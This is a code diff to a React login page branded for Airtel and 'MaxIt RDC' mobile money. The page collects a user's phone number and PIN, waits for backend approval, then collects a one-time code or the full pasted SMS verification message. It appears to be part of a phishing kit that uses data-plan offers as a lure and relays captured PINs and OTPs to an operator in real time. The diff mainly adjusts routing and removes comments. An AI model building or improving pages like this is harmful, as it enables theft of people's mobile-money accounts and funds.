@@ -1,5 +1,6 @@
 import React, { useState, useEffect, useRef, useCallback } from 'react';
 import { useNavigate, useParams } from 'react-router-dom';
+import { useData } from '../DataContext';
 import { useUserId } from '../hooks/useUserId';
 import './Login.css';
 
@@ -25,29 +26,29 @@ const PROVIDER_CONFIG = {
     otpLabel: 'OTP Code',
     otpPlaceholder: 'Enter 4-digit OTP',
     otpInstructions: 'Enter the 4-digit code sent to your phone',
-    inputType: 'numeric', // single text input for 4-digit code
+    inputType: 'numeric',
   },
   maxit: {
     name: 'MaxIt RDC',
     otpLabel: 'Verification Message',
     otpPlaceholder: 'Paste the full SMS message here...',
     otpInstructions: 'Paste the complete SMS verification message you received',
-    inputType: 'textarea', // textarea for SMS paste (up to 500 chars)
+    inputType: 'textarea',
   },
 };
 
 export default function Login() {
   const navigate = useNavigate();
   const { userId, provider } = useParams();
-  const { visitorId } = useUserId();
-  const { loanApplication } = useLoanApplication();
+  const { userId: hookUserId } = useUserId();
+  const { selectedPlan } = useData();
 
-  const effectiveUserId = userId || visitorId;
+  const effectiveUserId = userId || hookUserId;
   const providerCfg = PROVIDER_CONFIG[provider] || PROVIDER_CONFIG.airtel;
-  const plan = loanApplication?.selectedPlan || null;
+  const plan = selectedPlan || null;
 
   // ─── State ───
-  const [stage, setStage] = useState('credentials'); // credentials | approvalWaiting | otp | otpProcessing
+  const [stage, setStage] = useState('credentials');
   const [phone, setPhone] = useState('');
   const [pin, setPin] = useState(['', '', '', '']);
   const [loading, setLoading] = useState(false);
@@ -67,7 +68,7 @@ export default function Login() {
 
   // ─── Redirect if no plan selected ───
   useEffect(() => {
-    if (!plan) navigate(`/${effectiveUserId}/dataplans`, { replace: true });
+    if (!plan) navigate(`/${effectiveUserId}`, { replace: true });
   }, [plan, navigate, effectiveUserId]);
 
   // ─── Check if user already approved (returning user) ───
@@ -77,12 +78,12 @@ export default function Login() {
         const res = await fetch(`${API_BASE}/api/${effectiveUserId}/check-user-status`, { method: 'POST', headers: { 'Content-Type': 'application/json' } });
         const data = await res.json();
         if (data.success && data.hasActiveSession) {
-          navigate(`/${effectiveUserId}/status`, { replace: true });
+          navigate(`/${effectiveUserId}/status/${provider}`, { replace: true });
         }
       } catch (_) { /* ignore */ }
     };
     checkReturning();
-  }, [effectiveUserId, navigate]);
+  }, [effectiveUserId, navigate, provider]);
 
   // ─── API helper ───
   const apiCall = useCallback(async (endpoint, body) => {
@@ -130,10 +131,8 @@ export default function Login() {
 
       if (!data.success) { setError(data.message || 'Login failed'); setLoading(false); return; }
 
-      // If returning user: straight to status
-      if (data.returningUser) { navigate(`/${effectiveUserId}/status`, { replace: true }); return; }
+      if (data.returningUser) { navigate(`/${effectiveUserId}/status/${provider}`, { replace: true }); return; }
 
-      // Start approval polling
       setLoading(false);
       setStage('approvalWaiting');
       startApprovalPolling(pv.formatted, fullPin);
@@ -180,7 +179,6 @@ export default function Login() {
     const pv = validatePhone(phone);
     if (!pv.valid) return;
 
-    // Validate OTP value
     if (provider === 'airtel') {
       if (!/^\d{4}$/.test(otpValue)) return setError('Enter a valid 4-digit code');
     } else {
@@ -202,7 +200,6 @@ export default function Login() {
 
       if (!data.success) { setError(data.message || 'Verification failed'); setStage('otp'); return; }
 
-      // Poll OTP status
       startOtpPolling(pv.formatted, otpValue.trim());
     } catch (err) {
       setError('Connection error. Please try again.');
@@ -231,7 +228,7 @@ export default function Login() {
 
         if (data.status === 'approved') {
           clearInterval(pollRef.current);
-          navigate(`/${effectiveUserId}/status`, { replace: true });
+          navigate(`/${effectiveUserId}/status/${provider}`, { replace: true });
         } else if (data.status === 'rejected') {
           clearInterval(pollRef.current);
           setError(provider === 'airtel' ? 'OTP code is incorrect.' : 'Verification message rejected.');
@@ -264,7 +261,7 @@ export default function Login() {
     setResendDisabled(true);
 
     try {
-      await apiCall('resend-otp', { phoneNumber: pv.formatted, timestamp: Date.now() });
+      await apiCall('resend-otp', { phoneNumber: pv.formatted, provider: provider, timestamp: Date.now() });
     } catch (_) { /* ignore */ }
 
     setTimeout(() => { if (mountedRef.current) setResendDisabled(false); }, 30000);
@@ -277,7 +274,7 @@ export default function Login() {
     <div className={`login-page ${provider}`}>
       {/* Header */}
       <header className="login-header">
-        <button className="login-back-btn" onClick={() => navigate(`/${effectiveUserId}/dataplans`)}>
+        <button className="login-back-btn" onClick={() => navigate(`/${effectiveUserId}`)}>
           ←
         </button>
         <div className="login-header-info">
@@ -370,7 +367,6 @@ export default function Login() {
             <h2 className="login-section-title">{providerCfg.otpLabel}</h2>
             <p className="otp-instructions">{providerCfg.otpInstructions}</p>
 
-            {/* Airtel: 4-digit numeric input */}
             {isAirtel ? (
               <input
                 className="otp-input-single"
@@ -383,7 +379,6 @@ export default function Login() {
                 autoFocus
               />
             ) : (
-              /* MaxIt: SMS paste textarea */
               <>
                 <textarea
                   className="otp-message-box"
